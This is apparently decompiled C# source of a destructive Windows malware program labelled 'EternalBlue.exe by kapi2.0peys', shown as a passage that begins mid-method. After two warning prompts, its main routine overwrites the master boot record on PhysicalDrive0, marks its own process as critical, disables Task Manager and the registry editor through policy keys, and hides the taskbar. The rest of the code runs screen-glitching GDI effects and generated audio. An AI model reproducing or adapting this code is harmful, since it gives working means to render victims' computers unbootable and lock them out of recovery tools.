			Class6.StaticMethod26(a_, Class6.StaticMethod25("WAVE"));
			Class6.StaticMethod26(a_, Class6.StaticMethod25("fmt "));
			Class6.StaticMethod27(a_, 16U);
			Class6.StaticMethod28(a_, 1);
			int num = 1;
			int num2 = 8;
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod27(a_, (uint)A_0);
			Class6.StaticMethod27(a_, (uint)(A_0 * 1 * 8 / 8));
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod28(a_, 8);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("data"));
			int num3 = (int)A_1;
			byte[] array = new byte[A_0 * num3];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = (byte)(i >> (i >> 3) * i * (i & i >> 10));
			}
			Class6.StaticMethod27(a_, (uint)(array.Length * num * num2 / 8));
			foreach (byte a_2 in array)
			{
				Class6.StaticMethod29(a_, a_2);
			}
			Class6.StaticMethod30(a_, 4, SeekOrigin.Begin);
			Class6.StaticMethod27(a_, (uint)(Class6.StaticMethod32(Class6.StaticMethod31(a_)) - 8L));
			Class6.StaticMethod33(memoryStream, 0L, SeekOrigin.Begin);
			Class6.StaticMethod35(Class6.StaticMethod34(memoryStream));
		}
		finally
		{
			if (memoryStream != null)
			{
				Class6.StaticMethod36(memoryStream);
			}
		}
	}

	// Token: 0x06000074 RID: 116 RVA: 0x00005340 File Offset: 0x00003540
	private static void StaticMethod18(int A_0, double A_1)
	{
		Class6.StaticMethod37();
		MemoryStream memoryStream = Class6.StaticMethod23();
		try
		{
			BinaryWriter a_ = Class6.StaticMethod24(memoryStream);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("RIFF"));
			Class6.StaticMethod27(a_, 0U);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("WAVE"));
			Class6.StaticMethod26(a_, Class6.StaticMethod25("fmt "));
			Class6.StaticMethod27(a_, 16U);
			Class6.StaticMethod28(a_, 1);
			int num = 1;
			int num2 = 8;
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod27(a_, (uint)A_0);
			Class6.StaticMethod27(a_, (uint)(A_0 * 1 * 8 / 8));
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod28(a_, 8);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("data"));
			int num3 = (int)A_1;
			byte[] array = new byte[A_0 * num3];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = (byte)(i * ((i >> 7) * (i >> 9)));
			}
			Class6.StaticMethod27(a_, (uint)(array.Length * num * num2 / 8));
			foreach (byte a_2 in array)
			{
				Class6.StaticMethod29(a_, a_2);
			}
			Class6.StaticMethod30(a_, 4, SeekOrigin.Begin);
			Class6.StaticMethod27(a_, (uint)(Class6.StaticMethod32(Class6.StaticMethod31(a_)) - 8L));
			Class6.StaticMethod33(memoryStream, 0L, SeekOrigin.Begin);
			Class6.StaticMethod35(Class6.StaticMethod34(memoryStream));
		}
		finally
		{
			if (memoryStream != null)
			{
				Class6.StaticMethod36(memoryStream);
			}
		}
	}

	// Token: 0x06000075 RID: 117 RVA: 0x000054BC File Offset: 0x000036BC
	private static void StaticMethod19(int A_0, double A_1)
	{
		Class6.StaticMethod37();
		MemoryStream memoryStream = Class6.StaticMethod23();
		try
		{
			BinaryWriter a_ = Class6.StaticMethod24(memoryStream);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("RIFF"));
			Class6.StaticMethod27(a_, 0U);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("WAVE"));
			Class6.StaticMethod26(a_, Class6.StaticMethod25("fmt "));
			Class6.StaticMethod27(a_, 16U);
			Class6.StaticMethod28(a_, 1);
			int num = 1;
			int num2 = 8;
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod27(a_, (uint)A_0);
			Class6.StaticMethod27(a_, (uint)(A_0 * 1 * 8 / 8));
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod28(a_, 8);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("data"));
			int num3 = (int)A_1;
			byte[] array = new byte[A_0 * num3];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = (byte)(i * (i >> 6 & (i >> 5 & i >> 2)));
			}
			Class6.StaticMethod27(a_, (uint)(array.Length * num * num2 / 8));
			foreach (byte a_2 in array)
			{
				Class6.StaticMethod29(a_, a_2);
			}
			Class6.StaticMethod30(a_, 4, SeekOrigin.Begin);
			Class6.StaticMethod27(a_, (uint)(Class6.StaticMethod32(Class6.StaticMethod31(a_)) - 8L));
			Class6.StaticMethod33(memoryStream, 0L, SeekOrigin.Begin);
			Class6.StaticMethod35(Class6.StaticMethod34(memoryStream));
		}
		finally
		{
			if (memoryStream != null)
			{
				Class6.StaticMethod36(memoryStream);
			}
		}
	}

	// Token: 0x06000076 RID: 118 RVA: 0x0000563C File Offset: 0x0000383C
	private static void StaticMethod20(int A_0, double A_1)
	{
		Class6.StaticMethod37();
		MemoryStream memoryStream = Class6.StaticMethod23();
		try
		{
			BinaryWriter a_ = Class6.StaticMethod24(memoryStream);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("RIFF"));
			Class6.StaticMethod27(a_, 0U);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("WAVE"));
			Class6.StaticMethod26(a_, Class6.StaticMethod25("fmt "));
			Class6.StaticMethod27(a_, 16U);
			Class6.StaticMethod28(a_, 1);
			int num = 1;
			int num2 = 8;
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod27(a_, (uint)A_0);
			Class6.StaticMethod27(a_, (uint)(A_0 * 1 * 8 / 8));
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod28(a_, 8);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("data"));
			int num3 = (int)A_1;
			byte[] array = new byte[A_0 * num3];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = (byte)(430 * (8 * i >> 11 * i >> 4));
			}
			Class6.StaticMethod27(a_, (uint)(array.Length * num * num2 / 8));
			foreach (byte a_2 in array)
			{
				Class6.StaticMethod29(a_, a_2);
			}
			Class6.StaticMethod30(a_, 4, SeekOrigin.Begin);
			Class6.StaticMethod27(a_, (uint)(Class6.StaticMethod32(Class6.StaticMethod31(a_)) - 8L));
			Class6.StaticMethod33(memoryStream, 0L, SeekOrigin.Begin);
			Class6.StaticMethod35(Class6.StaticMethod34(memoryStream));
		}
		finally
		{
			if (memoryStream != null)
			{
				Class6.StaticMethod36(memoryStream);
			}
		}
	}

	// Token: 0x06000077 RID: 119 RVA: 0x000057C0 File Offset: 0x000039C0
	private static void StaticMethod21()
	{
		Class6.Class34 @class = new Class6.Class7();
		Class6.Class34 class2 = new Class6.Class28();
		Class6.Class34 class3 = new Class6.Class32();
		Class6.Class34 class4 = new Class6.Class33();
		Class6.Class34 class5 = new Class6.Class30();
		Class6.Class34 class6 = new Class6.Class31();
		Class6.Class34 class7 = new Class6.Class29();
		if (Class6.StaticMethod39("This is a Malware. Run?", "EternalBlue.exe by kapi2.0peys", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.Yes && Class6.StaticMethod39("Last Warning! It will overwrite MBR. Continue?", "EternalBlue.exe by kapi2.0peys", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.Yes)
		{
			byte[] array = new byte[512];
			Class6.StaticMethod40(array, fieldof(Class37.0022495C63ECA894874805597B567D6EBB141B4DCB014902BBCCA287E42D8528).FieldHandle);
			byte[] a_ = array;
			uint num;
			Class6.WriteFile(Class6.CreateFile("\\\\.\\PhysicalDrive0", 268435456U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero), a_, 512U, out num, IntPtr.Zero);
			try
			{
				int num2 = 1;
				Class6.StaticMethod41();
				Class6.NtSetInformationProcess(Class6.StaticMethod43(Class6.StaticMethod42()), 29, ref num2, 4);
			}
			catch
			{
			}
			try
			{
				Class6.StaticMethod45(Class6.StaticMethod44(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), "DisableTaskMgr", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Class6.StaticMethod45(Class6.StaticMethod44(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), "DisableRegistryTools", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			Class6.StaticMethod46(5000);
			try
			{
				Class6.ShowWindow(Class6.FindWindow("Shell_TrayWnd", ""), 0);
			}
			catch
			{
			}
			class3.Method0();
			class4.Method0();
			class5.Method0();
			class6.Method0();
			class7.Method0();
			@class.Method0();
			class2.Method0();
			Class6.StaticMethod1(11025, 30);
			Class6.StaticMethod2(11025, 30);
			Class6.StaticMethod3(11025, 30);
			Class6.StaticMethod4(11025, 30);
			Class6.StaticMethod5(11025, 30);
			Class6.StaticMethod6(11025, 30);
			Class6.StaticMethod7(11025, 30);
			Class6.StaticMethod8(11025, 30);
			Class6.StaticMethod9(11025, 30);
			Class6.StaticMethod10(11025, 30);
			Class6.StaticMethod11(11025, 30.0);
			Class6.StaticMethod12(11025, 30.0);
			Class6.StaticMethod13(11025, 30.0);
			Class6.StaticMethod14(11025, 30.0);
			Class6.StaticMethod15(11025, 30.0);
			Class6.StaticMethod16(11025, 30.0);
			Class6.StaticMethod17(11025, 30.0);
			Class6.StaticMethod18(11025, 30.0);
			Class6.StaticMethod19(11025, 30.0);
			Class6.StaticMethod20(11025, 30.0);
			Class6.StaticMethod47(69);
		}
	}

	// Token: 0x06000078 RID: 120
	[DllImport("gdi32.dll")]
	public static extern IntPtr SelectObject([In] IntPtr A_0, [In] IntPtr A_1);

	// Token: 0x06000079 RID: 121
	[DllImport("gdi32.dll")]
	private static extern IntPtr CreateSolidBrush(uint A_0);

	// Token: 0x0600007A RID: 122
	[DllImport("gdi32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DeleteObject([In] IntPtr A_0);

	// Token: 0x0600007B RID: 123
	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr GetDC(IntPtr A_0);

	// Token: 0x0600007C RID: 124
	[DllImport("user32.dll")]
	private static extern bool ReleaseDC(IntPtr A_0, IntPtr A_1);

	// Token: 0x0600007D RID: 125
	[DllImport("gdi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool BitBlt([In] IntPtr A_0, int A_1, int A_2, int A_3, int A_4, [In] IntPtr A_5, int A_6, int A_7, int A_8);

	// Token: 0x0600007E RID: 126
	[DllImport("gdi32.dll")]
	private static extern bool PatBlt(IntPtr A_0, int A_1, int A_2, int A_3, int A_4, CopyPixelOperation A_5);

	// Token: 0x0600007F RID: 127
	[DllImport("user32.dll")]
	private static extern bool RedrawWindow(IntPtr A_0, IntPtr A_1, IntPtr A_2, Class6.Enum0 A_3);

	// Token: 0x06000080 RID: 128
	[DllImport("gdi32.dll", SetLastError = true)]
	private static extern IntPtr CreateCompatibleDC([In] IntPtr A_0);

	// Token: 0x06000081 RID: 129
	[DllImport("msimg32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool AlphaBlend(IntPtr A_0, int A_1, int A_2, int A_3, int A_4, IntPtr A_5, int A_6, int A_7, int A_8, int A_9, Class6.Struct6 A_10);

	// Token: 0x06000082 RID: 130
	[DllImport("gdi32.dll")]
	private static extern IntPtr CreateCompatibleBitmap([In] IntPtr A_0, int A_1, int A_2);

	// Token: 0x06000083 RID: 131
	[DllImport("gdi32.dll")]
	private static extern bool StretchBlt(IntPtr A_0, int A_1, int A_2, int A_3, int A_4, IntPtr A_5, int A_6, int A_7, int A_8, int A_9, CopyPixelOperation A_10);

	// Token: 0x06000084 RID: 132
	[DllImport("gdi32.dll")]
	private static extern bool PlgBlt(IntPtr A_0, Class6.Struct7[] A_1, IntPtr A_2, int A_3, int A_4, int A_5, int A_6, IntPtr A_7, int A_8, int A_9);

	// Token: 0x06000085 RID: 133 RVA: 0x00005AAC File Offset: 0x00003CAC
	static Point StaticMethod22()
	{
		return Cursor.Position;
	}

	// Token: 0x06000086 RID: 134 RVA: 0x00005AC0 File Offset: 0x00003CC0
	static MemoryStream StaticMethod23()
	{
		return new MemoryStream();
	}

	// Token: 0x06000087 RID: 135 RVA: 0x00005AD4 File Offset: 0x00003CD4
	static BinaryWriter StaticMethod24(Stream A_0)
	{
		return new BinaryWriter(A_0);
	}

	// Token: 0x06000088 RID: 136 RVA: 0x00005AE8 File Offset: 0x00003CE8
	static char[] StaticMethod25(string A_0)
	{
		return A_0.ToCharArray();
	}

	// Token: 0x06000089 RID: 137 RVA: 0x00005AFC File Offset: 0x00003CFC
	static void StaticMethod26(BinaryWriter A_0, char[] A_1)
	{
		A_0.Write(A_1);
	}

	// Token: 0x0600008A RID: 138 RVA: 0x00005B10 File Offset: 0x00003D10
	static void StaticMethod27(BinaryWriter A_0, uint A_1)
	{
		A_0.Write(A_1);
	}

	// Token: 0x0600008B RID: 139 RVA: 0x00005B24 File Offset: 0x00003D24
	static void StaticMethod28(BinaryWriter A_0, ushort A_1)
	{
		A_0.Write(A_1);
	}

	// Token: 0x0600008C RID: 140 RVA: 0x00005B38 File Offset: 0x00003D38
	static void StaticMethod29(BinaryWriter A_0, byte A_1)
	{
		A_0.Write(A_1);
	}

	// Token: 0x0600008D RID: 141 RVA: 0x00005B4C File Offset: 0x00003D4C
	static long StaticMethod30(BinaryWriter A_0, int A_1, SeekOrigin A_2)
	{
		return A_0.Seek(A_1, A_2);
	}

	// Token: 0x0600008E RID: 142 RVA: 0x00005B64 File Offset: 0x00003D64
	static Stream StaticMethod31(BinaryWriter A_0)
	{
		return A_0.BaseStream;
	}

	// Token: 0x0600008F RID: 143 RVA: 0x00005B78 File Offset: 0x00003D78
	static long StaticMethod32(Stream A_0)
	{
		return A_0.Length;
	}

	// Token: 0x06000090 RID: 144 RVA: 0x00005B8C File Offset: 0x00003D8C
	static long StaticMethod33(Stream A_0, long A_1, SeekOrigin A_2)
	{
		return A_0.Seek(A_1, A_2);
	}

	// Token: 0x06000091 RID: 145 RVA: 0x00005BA4 File Offset: 0x00003DA4
	static SoundPlayer StaticMethod34(Stream A_0)
	{
		return new SoundPlayer(A_0);
	}

	// Token: 0x06000092 RID: 146 RVA: 0x00005BB8 File Offset: 0x00003DB8
	static void StaticMethod35(SoundPlayer A_0)
	{
		A_0.PlaySync();
	}

	// Token: 0x06000093 RID: 147 RVA: 0x00005BCC File Offset: 0x00003DCC
	static void StaticMethod36(IDisposable A_0)
	{
		A_0.Dispose();
	}

	// Token: 0x06000094 RID: 148 RVA: 0x00005BE0 File Offset: 0x00003DE0
	static Random StaticMethod37()
	{
		return new Random();
	}

	// Token: 0x06000095 RID: 149 RVA: 0x00005BF4 File Offset: 0x00003DF4
	static int StaticMethod38(Random A_0, int A_1, int A_2)
	{
		return A_0.Next(A_1, A_2);
	}

	// Token: 0x06000096 RID: 150 RVA: 0x00005C0C File Offset: 0x00003E0C
	static DialogResult StaticMethod39(string A_0, string A_1, MessageBoxButtons A_2, MessageBoxIcon A_3, MessageBoxDefaultButton A_4)
	{
		return MessageBox.Show(A_0, A_1, A_2, A_3, A_4);
	}

	// Token: 0x06000097 RID: 151 RVA: 0x00005C24 File Offset: 0x00003E24
	static void StaticMethod40(Array A_0, RuntimeFieldHandle A_1)
	{
		RuntimeHelpers.InitializeArray(A_0, A_1);
	}

	// Token: 0x06000098 RID: 152 RVA: 0x00005C38 File Offset: 0x00003E38
	static void StaticMethod41()
	{
		Process.EnterDebugMode();
	}

	// Token: 0x06000099 RID: 153 RVA: 0x00005C4C File Offset: 0x00003E4C
	static Process StaticMethod42()
	{
		return Process.GetCurrentProcess();
	}

	// Token: 0x0600009A RID: 154 RVA: 0x00005C60 File Offset: 0x00003E60
	static IntPtr StaticMethod43(Process A_0)
	{
		return A_0.Handle;
	}

	// Token: 0x0600009B RID: 155 RVA: 0x00005C74 File Offset: 0x00003E74
	static RegistryKey StaticMethod44(RegistryKey A_0, string A_1)
	{
		return A_0.CreateSubKey(A_1);
	}

	// Token: 0x0600009C RID: 156 RVA: 0x00005C88 File Offset: 0x00003E88
	static void StaticMethod45(RegistryKey A_0, string A_1, object A_2, RegistryValueKind A_3)
	{
		A_0.SetValue(A_1, A_2, A_3);
	}

	// Token: 0x0600009D RID: 157 RVA: 0x00002440 File Offset: 0x00000640
	static void StaticMethod46(int A_0)
	{
		Thread.Sleep(A_0);
	}

	// Token: 0x0600009E RID: 158 RVA: 0x00005CA0 File Offset: 0x00003EA0
	static void StaticMethod47(int A_0)
	{
		Environment.Exit(A_0);
	}

	// Token: 0x0400002B RID: 43
	private const int Field0 = 2;

	// Token: 0x0400002C RID: 44
	private const int Field1 = 4;

	// Token: 0x0400002D RID: 45
	private const int Field2 = 8;

	// Token: 0x0400002E RID: 46
	private const int Field3 = 16;

	// Token: 0x0400002F RID: 47
	private const uint Field4 = 2147483648U;

	// Token: 0x04000030 RID: 48
	private const uint Field5 = 1073741824U;

	// Token: 0x04000031 RID: 49
	private const uint Field6 = 536870912U;

	// Token: 0x04000032 RID: 50
	private const uint Field7 = 268435456U;

	// Token: 0x04000033 RID: 51
	private const uint Field8 = 1U;

	// Token: 0x04000034 RID: 52
	private const uint Field9 = 2U;

	// Token: 0x04000035 RID: 53
	private const uint Field10 = 3U;

	// Token: 0x04000036 RID: 54
	private const uint Field11 = 1073741824U;

	// Token: 0x04000037 RID: 55
	private const uint Field12 = 512U;

	// Token: 0x04000038 RID: 56
	private const int Field13 = 0;

	// Token: 0x04000039 RID: 57
	private const int Field14 = 1;

	// Token: 0x0400003A RID: 58
	public const int Field15 = 0;

	// Token: 0x0200000E RID: 14
	private class Class7 : Class6.Class34
	{
		// Token: 0x0600009F RID: 159 RVA: 0x00005CB4 File Offset: 0x00003EB4
		public virtual void Method0(IntPtr A_1)
		{
			for (int i = 0; i < Class6.Class7.StaticMethod0(this.Field1, 3, 5); i++)
			{
				base.Method3();
			}
			Class6.Class7.StaticMethod2(Class6.Class7.StaticMethod1(this.Field1, 15000));
		}

		// Token: 0x060000A1 RID: 161 RVA: 0x00005BF4 File Offset: 0x00003DF4
		static int StaticMethod0(Random A_0, int A_1, int A_2)
		{
			return A_0.Next(A_1, A_2);
		}

		// Token: 0x060000A2 RID: 162 RVA: 0x00005D08 File Offset: 0x00003F08
		static int StaticMethod1(Random A_0, int A_1)
		{
			return A_0.Next(A_1);
		}

		// Token: 0x060000A3 RID: 163 RVA: 0x00002440 File Offset: 0x00000640
		static void StaticMethod2(int A_0)
		{
			Thread.Sleep(A_0);
		}

		// Token: 0x0400003B RID: 59
		private new int Field0;
	}

	// Token: 0x0200000F RID: 15
	private class Class8 : Class6.Class34
	{
		// Token: 0x060000A4 RID: 164 RVA: 0x00005D1C File Offset: 0x00003F1C
		public virtual void Method0(IntPtr A_1)
		{
			IntPtr intPtr = Class6.CreateCompatibleDC(A_1);
			IntPtr intPtr2 = Class6.CreateCompatibleBitmap(A_1, this.Field2, this.Field3);
			Class6.SelectObject(intPtr, intPtr2);
			Class6.BitBlt(intPtr, 0, 0, this.Field2, this.Field3, A_1, 0, 0, 13369376);
			double num = (double)(Class6.Class8.StaticMethod1(Class6.Class8.StaticMethod0()).Width / 10);
			double num2 = (double)(Screen.PrimaryScreen.Bounds.Height / 10);
			float num3 = 0f;
			float num4 = 0f;
			float num5 = 10f;
			float num6 = 0f;
			while ((double)num6 < num)
			{
				float num7 = (float)Math.Sin((double)num6);
				this.Field0++;
				int field = this.Field0;
				int num8 = (int)(num3 * num5 + num4);
				Class6.BitBlt(intPtr, field, num8, 1, this.Field3, intPtr, field, 0, 13369376);
				Class6.BitBlt(intPtr, field, this.Field3 + num8, 1, this.Field3, intPtr, field, 0, 13369376);
				Class6.BitBlt(intPtr, field, -this.Field3 + num8, 1, this.Field3, intPtr, field, 0, 13369376);
				if (this.Field0 >= this.Field2)
				{
					this.Field0 = 0;
				}
				num3 = num7;
				num6 += 0.1f;
			}
			float num9 = 0f;
			while ((double)num9 < num2)
			{
				float num10 = (float)Math.Sin((double)num9);
				this.Field1++;
				int field2 = this.Field1;
				int num11 = (int)(num3 * num5 + num4);
				Class6.BitBlt(intPtr, num11, field2, this.Field2, 1, intPtr, 0, field2, 13369376);
				Class6.BitBlt(intPtr, this.Field2 + num11, field2, this.Field2, 1, intPtr, 0, field2, 13369376);
				Class6.BitBlt(intPtr, -this.Field2 + num11, field2, this.Field2, 1, intPtr, 0, field2, 13369376);
				if (this.Field1 >= this.Field3)
				{
					this.Field1 = 0;
				}
				num3 = num10;
				num9 += 0.1f;
			}
			Class6.BitBlt(A_1, 0, 0, this.Field2, this.Field3, intPtr, 0, 0, 13369376);
			Class6.DeleteObject(intPtr);
			Class6.DeleteObject(intPtr2);
			Thread.Sleep(this.Field1.Next(50));
		}

		// Token: 0x060000A6 RID: 166 RVA: 0x00005F6C File Offset: 0x0000416C
		static Screen StaticMethod0()
		{
			return Screen.PrimaryScreen;
		}

		// Token: 0x060000A7 RID: 167 RVA: 0x00005F80 File Offset: 0x00004180
		static Rectangle StaticMethod1(Screen A_0)
		{
			return A_0.Bounds;
		}

		// Token: 0x0400003C RID: 60
		private new int Field0;

		// Token: 0x0400003D RID: 61
		private new int Field1;
	}

	// Token: 0x02000010 RID: 16
	private class Class9 : Class6.Class34
	{
		// Token: 0x060000A8 RID: 168 RVA: 0x00005F94 File Offset: 0x00004194
		public virtual void Method0(IntPtr A_1)
		{
			int a_ = Class6.Class9.StaticMethod0(this.Field1, -1, 2) * 50;
			int a_2 = Class6.Class9.StaticMethod0(this.Field1, -1, 2) * 50;
			for (int i = 0; i < Class6.Class9.StaticMethod1(this.Field1, 10); i++)
			{
				Class6.BitBlt(A_1, 0, 0, this.Field2, this.Field3, A_1, a_, a_2, 13369376);
				Class6.Class9.StaticMethod2(Class6.Class9.StaticMethod1(this.Field1, 10));
			}
		}

		// Token: 0x060000AA RID: 170 RVA: 0x00005BF4 File Offset: 0x00003DF4
		static int StaticMethod0(Random A_0, int A_1, int A_2)
		{
			return A_0.Next(A_1, A_2);
		}

		// Token: 0x060000AB RID: 171 RVA: 0x00005D08 File Offset: 0x00003F08
		static int StaticMethod1(Random A_0, int A_1)
		{
			return A_0.Next(A_1);
		}

		// Token: 0x060000AC RID: 172 RVA: 0x00002440 File Offset: 0x00000640
		static void StaticMethod2(int A_0)
		{
			Thread.Sleep(A_0);
		}

		// Token: 0x0400003E RID: 62
		private new int Field0;
	}

	// Token: 0x02000011 RID: 17
	private class Class10 : Class6.Class34
	{
		// Token: 0x060000AD RID: 173 RVA: 0x0000600C File Offset: 0x0000420C
		public virtual void Method0(IntPtr A_1)
		{
			try
			{
				int x = Class6.Class10.StaticMethod1(Class6.Class10.StaticMethod0()).X;
				int y = Screen.PrimaryScreen.Bounds.Y;
				int left = Screen.PrimaryScreen.Bounds.Left;
				int top = Screen.PrimaryScreen.Bounds.Top;
				int right = Screen.PrimaryScreen.Bounds.Right;
				int bottom = Screen.PrimaryScreen.Bounds.Bottom;
				Class6.Struct7[] array = new Class6.Struct7[3];
				Graphics graphics = Graphics.FromHdc(A_1);
				IntPtr intPtr = Class6.CreateCompatibleDC(A_1);
				IntPtr intPtr2 = Class6.CreateCompatibleBitmap(A_1, this.Field2, this.Field3);
				Class6.SelectObject(intPtr, intPtr2);
				array[0].Field0 = left + this.Field1.Next(-10, 10);
				array[0].Field1 = top + this.Field1.Next(-10, 10);
				array[1].Field0 = right + this.Field1.Next(-10, 10);
				array[1].Field1 = top + this.Field1.Next(-10, 10);
				array[2].Field0 = left - this.Field1.Next(-10, 10);
				array[2].Field1 = bottom - this.Field1.Next(-10, 10);
				Class6.PlgBlt(intPtr, array, A_1, left, top, right - left, bottom - top, IntPtr.Zero, 0, 0);
				Class6.StretchBlt(intPtr, 10, 10, this.Field2 - 20, this.Field3 - 20, intPtr, 0, 0, this.Field2, this.Field3, CopyPixelOperation.SourceCopy);
				Class6.BitBlt(A_1, 0, 0, this.Field2, this.Field3, intPtr, 0, 0, 13369376);
				graphics.DrawString("EternalBlue.exe", new Font(FontFamily.GenericMonospace, (float)this.Field1.Next(1, 100)), new SolidBrush(Color.FromArgb(0, 0, this.Field1.Next(255))), (float)this.Field1.Next(this.Field2), (float)this.Field1.Next(this.Field3));
				Class6.DeleteObject(intPtr);
				Class6.DeleteObject(intPtr2);
				Thread.Sleep(this.Field1.Next(10));
			}
			catch
			{
			}
		}

		// Token: 0x060000AF RID: 175 RVA: 0x00005F6C File Offset: 0x0000416C
		static Screen StaticMethod0()
		{
			return Screen.PrimaryScreen;
		}

		// Token: 0x060000B0 RID: 176 RVA: 0x00005F80 File Offset: 0x00004180
		static Rectangle StaticMethod1(Screen A_0)
		{
			return A_0.Bounds;
		}

		// Token: 0x0400003F RID: 63
		private new int Field0;
	}

	// Token: 0x02000012 RID: 18
	private class Class11 : Class6.Class34
	{
		// Token: 0x060000B1 RID: 177 RVA: 0x0000628C File Offset: 0x0000448C
		public virtual void Method0(IntPtr A_1)
		{
			IntPtr intPtr = Class6.CreateCompatibleDC(A_1);
			IntPtr intPtr2 = Class6.CreateCompatibleBitmap(A_1, this.Field2, this.Field3);
			Class6.SelectObject(intPtr, intPtr2);
			Class6.BitBlt(intPtr, 0, 0, this.Field2, this.Field3, A_1, 0, 0, 13369376);
			Class6.BitBlt(intPtr, 0, 0, this.Field2, this.Field3, A_1, Class6.Class11.StaticMethod0(this.Field1, -10, 10), Class6.Class11.StaticMethod0(this.Field1, -10, 10), 6684742);
			IntPtr a_ = Class6.CreateSolidBrush((uint)Class6.Class11.StaticMethod1(Color.Blue));
			Class6.SelectObject(intPtr, a_);
			Class6.PatBlt(intPtr, 0, 0, this.Field2, this.Field3, CopyPixelOperation.PatInvert);
			Class6.BitBlt(A_1, 0, 0, this.Field2, this.Field3, intPtr, 0, 0, 13369376);
			Class6.DeleteObject(intPtr);
			Class6.DeleteObject(intPtr2);
			Class6.Class11.StaticMethod3(Class6.Class11.StaticMethod2(this.Field1, 10));
		}

		// Token: 0x060000B3 RID: 179 RVA: 0x00005BF4 File Offset: 0x00003DF4
		static int StaticMethod0(Random A_0, int A_1, int A_2)
		{
			return A_0.Next(A_1, A_2);
		}

		// Token: 0x060000B4 RID: 180 RVA: 0x00006380 File Offset: 0x00004580
		static int StaticMethod1(Color A_0)
		{
			return ColorTranslator.ToWin32(A_0);
		}

		// Token: 0x060000B5 RID: 181 RVA: 0x00005D08 File Offset: 0x00003F08
		static int StaticMethod2(Random A_0, int A_1)
		{
			return A_0.Next(A_1);
		}

		// Token: 0x060000B6 RID: 182 RVA: 0x00002440 File Offset: 0x00000640
		static void StaticMethod3(int A_0)
		{
			Thread.Sleep(A_0);
		}

		// Token: 0x04000040 RID: 64
		private new int Field0;
	}

	// Token: 0x02000013 RID: 19
	private class Class12 : Class6.Class34
	{
		// Token: 0x060000B7 RID: 183 RVA: 0x00006394 File Offset: 0x00004594
		public virtual void Method0(IntPtr A_1)
		{
			try
			{
				int num = Class6.Class12.StaticMethod0(this.Field1, 1, 3);
				IntPtr intPtr = Class6.CreateCompatibleDC(A_1);
				IntPtr intPtr2 = Class6.CreateCompatibleBitmap(A_1, this.Field2, this.Field3);
				Class6.SelectObject(intPtr, intPtr2);
				Graphics a_ = Class6.Class12.StaticMethod1(intPtr);
				if (num == 1)
				{
					Class6.Class12.StaticMethod6(a_, "EternalBlue.exe", Class6.Class12.StaticMethod3(Class6.Class12.StaticMethod2(), (float)Class6.Class12.StaticMethod0(this.Field1, 1, 100)), Class6.Class12.StaticMethod4(Color.White), (float)Class6.Class12.StaticMethod5(this.Field1, this.Field2), (float)Class6.Class12.StaticMethod5(this.Field1, this.Field3));
				}
				else if (num == 2)
				{
					Class6.Class12.StaticMethod6(a_, "kapi2.0peys", Class6.Class12.StaticMethod3(Class6.Class12.StaticMethod2(), (float)Class6.Class12.StaticMethod0(this.Field1, 1, 100)), Class6.Class12.StaticMethod4(Color.White), (float)Class6.Class12.StaticMethod5(this.Field1, this.Field2), (float)Class6.Class12.StaticMethod5(this.Field1, this.Field3));
				}
				Class6.BitBlt(A_1, 0, 0, this.Field2, this.Field3, intPtr, 0, 0, 6684742);
				Class6.DeleteObject(intPtr);
				Class6.DeleteObject(intPtr2);
				Class6.Class12.StaticMethod7(Class6.Class12.StaticMethod5(this.Field1, 10));
			}
			catch
			{
			}
		}

		// Token: 0x060000B9 RID: 185 RVA: 0x00005BF4 File Offset: 0x00003DF4
		static int StaticMethod0(Random A_0, int A_1, int A_2)
		{
			return A_0.Next(A_1, A_2);
		}

		// Token: 0x060000BA RID: 186 RVA: 0x000064E8 File Offset: 0x000046E8
		static Graphics StaticMethod1(IntPtr A_0)
		{
			return Graphics.FromHdc(A_0);
		}

		// Token: 0x060000BB RID: 187 RVA: 0x000064FC File Offset: 0x000046FC
		new static FontFamily StaticMethod2()
		{
			return FontFamily.GenericSansSerif;
		}

		// Token: 0x060000BC RID: 188 RVA: 0x00006510 File Offset: 0x00004710
		static Font StaticMethod3(FontFamily A_0, float A_1)
		{
			return new Font(A_0, A_1);
		}

		// Token: 0x060000BD RID: 189 RVA: 0x00006524 File Offset: 0x00004724
		static SolidBrush StaticMethod4(Color A_0)
		{
			return new SolidBrush(A_0);
		}

		// Token: 0x060000BE RID: 190 RVA: 0x00005D08 File Offset: 0x00003F08
		static int StaticMethod5(Random A_0, int A_1)
		{
			return A_0.Next(A_1);
		}

		// Token: 0x060000BF RID: 191 RVA: 0x00006538 File Offset: 0x00004738
		static void StaticMethod6(Graphics A_0, string A_1, Font A_2, Brush A_3, float A_4, float A_5)
		{
